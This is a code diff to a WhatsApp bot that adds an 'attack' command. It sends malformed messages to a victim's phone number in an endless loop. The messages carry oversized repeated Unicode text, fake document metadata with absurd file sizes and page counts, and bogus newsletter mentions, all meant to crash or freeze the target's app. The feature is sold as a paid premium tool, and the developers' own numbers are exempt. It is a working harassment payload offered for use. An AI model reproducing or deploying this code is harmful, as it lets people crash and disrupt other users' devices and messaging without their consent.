@@ -12,8 +12,204 @@ const {
 
 
 
+cmd({
+    pattern: "attack",
+    react: "🔖",
+    desc: "To take owner number",
+    category: "bug",
+    use: '.bug 947xxxxx',
+    filename: __filename
+},    
+async(conn, mek, m,{from, prefix, l, quoted, body, isDev, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply}) => {
+try{
+
+if ( !isDev ) return reply('⚠️ *Contact owner to Active your number To Premium user/ බොට් ඇක්ටිව් කරගැනිමට හිමිකරු වෙත පිවිසෙන්න  ⚠️*\n\n_~ඔබට Bug ගැනිමට අවශ්‍යන්ම් පහත අංකයට මැසෙජ් එකක් දමා ඇක්ටීව් කරගන්න නැතහොත් පහත තිබෙන ආකාරයට commamd එක ගහන්න~_\n\n1) *Command එකක් මගින් ඇක්ටිව් කරගැනීමට*\n- .premium <mobitel card number>\nEg:- .premium 0000 0000 0000\n\n2) *ඩිරෙක්ට් හිමිකරු වෙත පිවිස ඇක්ටිව් කරගැනීමට*\n- https://wa.me/94711453097 👉 Price 200 Mobitel Card Only')
+	
+ if(from.includes('94719199757') || from.includes('94703475691') || from.includes('94711453097') || from.includes('94711453361')) return reply('Sorry, I cant upload code to my Vajira developer 🥱\nTry to use it on another private!!\n මෝඩ පොන්නය මට ගහන්න ඉයා කක්ක දාලා වරෙන්')
+	
+if (!isMe) return reply('_</> owner only..._')
 
 
+async function func1(target) {
+    await conn.relayMessage(target, {
+        groupMentionedMessage: {
+            message: {
+                interactiveMessage: {
+                    header: {
+                        locationMessage: {
+                            degreesLatitude: 0,
+                            degreesLongitude: 0
+                        },
+                        hasMediaAttachment: true
+                    },
+                    body: {
+                        text: "𝗩𝗔𝗝𝗜𝗥𝗔-𝗠𝗗|𝗩9 𝟯⃟🐦💥" + "ꦹꦹꦹ".repeat(400000)
+                    },
+                    nativeFlowMessage: {},
+                    contextInfo: {
+                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
+                        groupMentions: [{ groupJid: "1@newsletter", groupSubject: "  𝗩𝗔𝗝𝗜𝗥𝗔-𝗠𝗗|𝗩9 𝟯⃟🐦💥" }]
+                    }
+                }
+            }
+        }
+    }, { participant: { jid: target } }, { messageId: null });
+}
+
+
+
+async function ngeloc(target, kuwoted) {
+var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
+viewOnceMessage: {
+message: {
+  "liveLocationMessage": {
+    "degreesLatitude": "p",
+    "degreesLongitude": "p",
+    "caption": `𝗩𝗔𝗝𝗜𝗥𝗔-𝗠𝗗|𝗩9 𝟯⃟🐦💥`+"ꦾ".repeat(50000),
+    "sequenceNumber": "0",
+    "jpegThumbnail": ""
+     }
+  }
+}
+}), { userJid: target, quoted: kuwoted })
+await conn.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id })
+}
+
+
+async function killui(target, Ptcp = true) {
+      await conn.relayMessage(
+        target,
+        {
+          ephemeralMessage: {
+            message: {
+              interactiveMessage: {
+                header: {
+                  documentMessage: {
+                    url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
+                    mimetype:
+                      "application/vnd.openxmlformats-officedocument.presentationml.presentation",
+                    fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
+                    fileLength: "9999999999999",
+                    pageCount: 1316134911,
+                    mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
+                    fileName: "⿻",
+                    fileEncSha256:
+                      "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
+                    directPath:
+                      "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
+                    mediaKeyTimestamp: "1726867151",
+                    contactVcard: true,
+                    jpegThumbnail: config.LOGO,
+                  },
+                  hasMediaAttachment: true,
+                },
+                body: {
+                  text: "⿻\n" + "ꦾ".repeat(28000),
+                },
+                nativeFlowMessage: {
+                  messageParamsJson: "{}",
+                },
+                contextInfo: {
+                  mentionedJid: ["24105730123@s.whatsapp.net"],
+                  forwardingScore: 1,
+                  isForwarded: true,
+                  fromMe: false,
+                  participant: "0@s.whatsapp.net",
+                  remoteJid: "status@broadcast",
+                  quotedMessage: {
+                    documentMessage: {
+                      url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
+                      mimetype:
+                        "application/vnd.openxmlformats-officedocument.presentationml.presentation",
+                      fileSha256:
+                        "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
+                      fileLength: "9999999999999",
+                      pageCount: 1316134911,
+                      mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
+                      fileName: "Дѵөҫдԁө Ԍҵдѵд tђคเlคภ๔",
+                      fileEncSha256:
+                        "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
+                      directPath:
+                        "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
+                      mediaKeyTimestamp: "1724474503",
+                      contactVcard: true,
+                      thumbnailDirectPath:
+                        "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
+                      thumbnailSha256:
+                        "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
+                      thumbnailEncSha256:
+                        "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
+                      jpegThumbnail: "",
+                    },
+                  },
+                },
+              },
+            },
+          },
+        },
+        Ptcp
+          ? {
+              participant: {
+                jid: target,
+              },
+            }
+          : {}
+      );
+}
+
+async function DocBug(target) {
+ let virtex = "𝗩𝗔𝗝𝗜𝗥𝗔-𝗠𝗗|𝗩9 𝟯⃟🐦💥 𝐈𝐦𝐮𝐭⚡";
+   conn.relayMessage(target, {
+     groupMentionedMessage: {
+       message: {
+        interactiveMessage: {
+          header: {
+            documentMessage: {
+              url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
+                                    mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
+                                    fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
+                                    fileLength: "99999999999",
+                                    pageCount: 0x9184e729fff,
+                                    mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
+                                    fileName: virtex,
+                                    fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
+                                    directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
+                                    mediaKeyTimestamp: "1715880173",
+                                    contactVcard: true
+                                },
+                                hasMediaAttachment: true
+                            },
+                            body: {
+                                text: "⚡𝗩𝗔𝗝𝗜𝗥𝗔-𝗠𝗗|𝗩9 𝟯⃟🐦💥 𝐈𝐦𝐮𝐭⚡" + "ꦾ".repeat(100000) + "@1".repeat(300000)
+                            },
+                            nativeFlowMessage: {},
+                            contextInfo: {
+                                mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
+                                groupMentions: [{ groupJid: "1@newsletter", groupSubject: "igwe" }]
+                            }
+                        }
+                    }
+                }
+            }, { participant: { jid: target } });
+        };	
+	
+target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
+reply(`The bugs ${prefix+command} were successfully sent to the destination number. Please wait at least 5 minutes before sending others bugs rakuzan|𝗩5 ⃟*`);
+for (let i = 0; ; i++) {
+await func1(target);
+await ngeloc(target);
+await killui(target);
+await DocBug(target)
+}
+	
+await conn.sendMessage(from, { react: { text: `✅`, key: mek.key }}) 
+} catch (e) {
+reply('*Error !!*')
+l(e)
+}
+})
+
+	
 
 cmd({
     pattern: "wacrash",
